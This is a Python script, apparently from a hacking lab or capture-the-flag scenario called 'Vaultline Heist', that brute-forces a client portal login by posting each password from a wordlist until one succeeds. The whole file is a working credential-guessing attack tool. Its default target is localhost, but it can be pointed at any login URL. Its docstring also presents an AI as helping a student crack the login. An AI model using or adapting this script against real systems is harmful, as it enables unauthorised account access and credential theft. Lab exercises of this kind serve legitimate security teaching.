"""
Vaultline Heist — password brute-forcer (Stage 1).

Tries each password from a wordlist against the client portal login until one
works. This is the kind of script a student (with a hand from an AI) writes to
crack the login.

Usage:
    python tools/brute_force.py <username> [base_url] [wordlist]
"""

import sys
import requests

username = sys.argv[1] if len(sys.argv) > 1 else "i.fenwick"
base = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:8000"
wordlist = sys.argv[3] if len(sys.argv) > 3 else "tools/wordlist.txt"
url = base.rstrip("/") + "/portal/login/"

print(f"[*] Brute-forcing {username} at {url}\n")

for line in open(wordlist, encoding="latin-1", errors="ignore"):
    password = line.strip()
    if not password:
        continue
    r = requests.post(url, json={"username": username, "password": password})
    if r.status_code == 200 and r.json().get("success"):
        print(f"[+] FOUND -> {username} : {password}")
        break
else:
    print("[-] Not found. Wrong wordlist?")
